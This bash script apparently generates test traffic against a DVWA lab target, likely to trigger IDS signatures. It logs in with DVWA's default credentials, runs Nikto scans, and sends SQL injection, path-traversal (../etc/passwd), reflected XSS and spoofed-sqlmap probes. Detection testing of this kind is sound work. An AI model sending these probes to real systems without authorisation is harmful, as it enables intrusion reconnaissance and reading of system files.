#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"
SESSION_FILE="/tmp/dvwa_web_${RUN_ID}.txt"

echo "[run_id=$RUN_ID] Web scan starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Establish authenticated DVWA session
curl -s -c "$SESSION_FILE" -b "" \
  -X POST "http://$TARGET_IP/dvwa/login.php" \
  -d "username=admin&password=password&Login=Login" -L -o /dev/null || true

# Nikto scan — full server and DVWA subtree
nikto -h "http://$TARGET_IP" -maxtime 60 || true
nikto -h "http://$TARGET_IP/dvwa" -maxtime 30 || true

# DVWA-specific path probes (IDS signature triggers)
curl -s -b "$SESSION_FILE" "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1'" -o /dev/null || true
curl -s -b "$SESSION_FILE" "http://$TARGET_IP/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd" -o /dev/null || true
curl -s -b "$SESSION_FILE" "http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>" -o /dev/null || true
curl -s -b "$SESSION_FILE" "http://$TARGET_IP/dvwa/vulnerabilities/upload/" -o /dev/null || true
curl -s -A "sqlmap/1.0" "http://$TARGET_IP/dvwa/login.php" -o /dev/null || true
curl -s "http://$TARGET_IP/dvwa/?q=UNION+SELECT+null,null--" -o /dev/null || true

rm -f "$SESSION_FILE" || true
echo "[run_id=$RUN_ID] Web scan done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"